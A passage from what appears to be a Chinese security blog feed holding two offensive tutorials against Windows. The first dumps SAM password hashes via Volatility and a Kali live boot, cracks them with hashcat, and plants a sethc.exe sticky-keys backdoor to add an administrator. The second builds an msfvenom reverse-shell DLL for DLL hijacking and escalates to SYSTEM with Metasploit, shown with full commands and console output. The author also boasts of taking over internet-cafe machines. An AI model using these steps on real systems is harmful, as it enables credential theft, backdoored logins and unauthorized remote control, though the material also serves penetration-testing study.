<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hivelist -f memory.dmp –profile=Win7SP1x64</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419110839_6RL5dK_Screenshot.jpeg" alt=""></p>
<h4 id="3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"><a href="#3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！" class="headerlink" title="3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"></a>3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！</h4><blockquote>
<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hashdump -f memory.dmp –profile=Win7SP1x64 sys-offset=0xfffff8a000024010 sam-offset=0xfffff8a000b33010</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419111612_Tkq2jz_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h2><h4 id="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><a href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。" class="headerlink" title="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"></a>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</h4><h4 id="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><a href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。" class="headerlink" title="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"></a>在开始之前我们应该先准备一个USB启动盘，制作方法可以看我<a href="https://times0ng.github.io/2018/03/01/kali安装KVM入坑笔记/">以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</h4><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10"><a href="#emsp-emsp-windows-10" class="headerlink" title="&emsp;&emsp;windows 10"></a>&emsp;&emsp;windows 10</h4><h4 id="emsp-emsp-kali-ISO-emsp-download-here"><a href="#emsp-emsp-kali-ISO-emsp-download-here" class="headerlink" title="&emsp;&emsp;kali ISO &emsp;// download here"></a>&emsp;&emsp;kali ISO &emsp;// <a href="https://www.kali.org/downloads/" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><a href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）" class="headerlink" title="1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）"></a>1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419184849_OuzqV7_Screenshot.jpeg" alt=""></p>
<h4 id="2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><a href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可" class="headerlink" title="2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可"></a>2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419185050_jKbLW5_Screenshot.jpeg" alt=""></p>
<h4 id="3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了"><a href="#3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了" class="headerlink" title="3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了"></a>3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</h4><blockquote>
<p>fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/ </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419185436_ohOVSp_Screenshot.jpeg" alt=""></p>
<h4 id="4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"><a href="#4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】" class="headerlink" title="4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"></a>4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</h4><blockquote>
<p>cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM</p>
<p>hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt <strong>-</strong>-force</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180420121521_8LVsuZ_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419190846_DSIMrd_Screenshot.jpeg" alt=""></p>
<h4 id="5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上"><a href="#5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上" class="headerlink" title="5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows 提权基础 讲漏了，这里补上"></a>5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇<a href="https://times0ng.github.io/2018/04/13/Windows-提权基础（下）/">Windows 提权基础</a> 讲漏了，这里补上</h4><blockquote>
<p>cd /mnt/Windows/System32/</p>
<p>cp cmd.exe sethc.exe</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419192009_pBbNtJ_Screenshot.jpeg" alt=""></p>
<h4 id="6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><a href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行" class="headerlink" title="6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"></a>6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419193253_crhGWM_Screenshot.jpeg" alt=""></p>
<h4 id="7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"><a href="#7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼" class="headerlink" title="7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"></a>7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</h4><blockquote>
<p>net user test test /add</p>
<p>net localgroup administrators /add test</p>
<p>logoff</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419195550_4l4ZGP_Screenshot.jpeg" alt=""></p>
<h4 id="8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"><a href="#8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】" class="headerlink" title="8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"></a>8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</h4><blockquote>
<p>net user time0sng toor</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419200844_4N3J4b_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。"><a href="#希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。" class="headerlink" title="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。"></a>希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows 提权基础（下）]]></title>
      <url>/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"><a href="#今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！" class="headerlink" title="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"></a>今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！</h4><a id="more"></a>
<h2 id="0x01-DLL-劫持原理"><a href="#0x01-DLL-劫持原理" class="headerlink" title="0x01. DLL 劫持原理"></a>0x01. DLL 劫持原理</h2><h4 id="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。"><a href="#原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。" class="headerlink" title="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。"></a>原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。</h4><h4 id="原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的"><a href="#原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的" class="headerlink" title="原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的"></a>原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的</h4><h4 id="下面你可以看到在一个32-位系统中DLL-的搜索顺序："><a href="#下面你可以看到在一个32-位系统中DLL-的搜索顺序：" class="headerlink" title="下面你可以看到在一个32 位系统中DLL 的搜索顺序："></a>下面你可以看到在一个32 位系统中DLL 的搜索顺序：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 - The directory from which the application loaded</div><div class="line">2 - 32-bit System directory (C:\Windows\System32)</div><div class="line">3 - 16-bit System directory (C:\Windows\System)</div><div class="line">4 - Windows directory (C:\Windows)</div><div class="line">5 - The current working directory (CWD)</div><div class="line">6 - Directories in the PATH environment variable (system then user)</div></pre></td></tr></table></figure>
<h4 id="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。"><a href="#通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。" class="headerlink" title="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。"></a>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。</h4><h2 id="0x02-实战演示"><a href="#0x02-实战演示" class="headerlink" title="0x02. 实战演示"></a>0x02. 实战演示</h2><h4 id="1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中"><a href="#1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中" class="headerlink" title="1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中"></a>1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410222237_MewziO_Screenshot.jpeg" alt=""></p>
<h4 id="2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"><a href="#2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！" class="headerlink" title="2. 然后调用工具 DllHijackAuditor 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"></a>2. 然后调用工具 <a href="https://securityxploded.com/getsoftware_direct.php?id=7777" target="_blank" rel="external">DllHijackAuditor</a> 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410223301_Bp44of_Screenshot.jpeg" alt=""></p>
<h4 id="3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。"><a href="#3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。" class="headerlink" title="3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。"></a>3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。</h4><blockquote>
<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.175.143 lport=4444 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0.dll</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410224504_LFKxXq_Screenshot.jpeg" alt=""></p>
<h4 id="4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell"><a href="#4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell" class="headerlink" title="4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell"></a>4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell</h4><blockquote>
<p>echo %path% </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410224735_dwsj0R_Screenshot.jpeg" alt=""></p>
<h4 id="5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"><a href="#5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限" class="headerlink" title="5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"></a>5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(multi/handler) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(multi/handler) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410225355_mtdLaD_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410225440_7mMEIN_Screenshot.jpeg" alt=""></p>
<h4 id="6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM"><a href="#6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM" class="headerlink" title="6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM"></a>6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sc create &quot;times0ng test&quot; binPath= &quot;C:\Program Files (x86)\times0ng test\just test\evil.exe&quot; start= auto</div><div class="line"></div><div class="line">cd C:\Program Files (x86)</div><div class="line"></div><div class="line">mkdir &quot;times0ng test\just test&quot;</div><div class="line"></div><div class="line">icacls &quot;C:\Program Files (x86)\times0ng test&quot; /grant Everyone:(OI)(CI)F /T</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410230219_rieB2E_Screenshot.jpeg" alt=""></p>
<h4 id="7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限"><a href="#7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限" class="headerlink" title="7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限"></a>7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限</h4><blockquote>
<p>use exploit/windows/local/trusted_service_path</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">C:\Program Files (x86)&gt;exit</div><div class="line">exit</div><div class="line">meterpreter &gt; </div><div class="line">meterpreter &gt; background </div><div class="line">[*] Backgrounding session 8...</div><div class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set session 8</div><div class="line">session =&gt; 8</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444 </div><div class="line">[*] Finding a vulnerable service...</div><div class="line">[*] Placing C:\Program.exe for times0ng test</div><div class="line">[*] Writing 15872 bytes to C:\Program.exe...</div><div class="line">[*] Launching service times0ng test...</div><div class="line">[*] Sending stage (179779 bytes) to 192.168.175.145</div><div class="line">[*] Meterpreter session 9 opened (192.168.175.143:4444 -&gt; 192.168.175.145:49286) at 2018-04-10 11:05:23 -0400</div><div class="line">[!] This exploit may require manual cleanup of &apos;C:\Program.exe&apos; on the target</div><div class="line"></div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: NT AUTHORITY\SYSTEM</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
